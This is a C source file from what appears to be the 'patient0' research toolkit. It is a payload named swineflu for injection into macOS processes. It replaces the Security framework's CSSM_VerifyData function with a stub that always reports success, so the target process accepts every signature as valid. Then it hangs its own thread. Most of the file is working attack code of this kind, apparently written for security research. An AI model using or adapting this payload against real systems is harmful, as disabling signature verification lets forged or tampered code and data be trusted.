/* swineflu.c
 *
 * Copyright (c) 2009 Will Drewry <redpig@dataspill.org>. All rights reserved.
 * Use of this source code is governed by a BSD-style license that can be
 * found in the LICENSE file or at http://github.org/redpig/patient0.
 */
#include <dlfcn.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#include <patient0/log.h>
#include <patient0/mach_jump.h>
#include <patient0/mach_jump/clobber.h>
#include <patient0/runtime.h>

/* Extract from /System/Library/Frameworks/Security.framework/Versions/A/Headers/ */

typedef int32_t sint32;
typedef sint32 CSSM_RETURN;
typedef intptr_t CSSM_INTPTR;
typedef size_t CSSM_SIZE;
#define CSSMAPI
enum {
    CSSM_OK =                                                       0
};
typedef uint64_t CSSM_LONG_HANDLE, *CSSM_LONG_HANDLE_PTR;
typedef CSSM_LONG_HANDLE CSSM_CC_HANDLE; /* Cryptographic Context Handle */

typedef struct cssm_data {
    CSSM_SIZE Length; /* in bytes */
    uint8_t *Data;
} CSSM_DATA, *CSSM_DATA_PTR;

typedef uint32_t CSSM_ALGORITHMS;
static CSSM_RETURN CSSMAPI
swineflu_CSSM_VerifyData(CSSM_CC_HANDLE CCHandle,
                          const CSSM_DATA *DataBufs,
                          uint32_t DataBufCount,
                          CSSM_ALGORITHMS DigestAlgorithm,
                          const CSSM_DATA *Signature) {
  return CSSM_OK;
}
static intptr_t verify_data_ptr = (intptr_t)swineflu_CSSM_VerifyData;

void run(unsigned char *code, uint32_t size) {
  p0_logf(P0_INFO, "swineflu running");
  /* install function replacements */
  mach_jump_init();
  if (!clobber_function_by_symbol("CSSM_VerifyData", (intptr_t)&verify_data_ptr)) {
    p0_logf(P0_ERR, "failed to clobber CSSM_VerifyData");
    /* Let's at least patch it out for the main process */
    mach_jump_patch("CSSM_VerifyData", swineflu_CSSM_VerifyData);
  }
  /* hang this thread */
  runtime_deadlock();
}
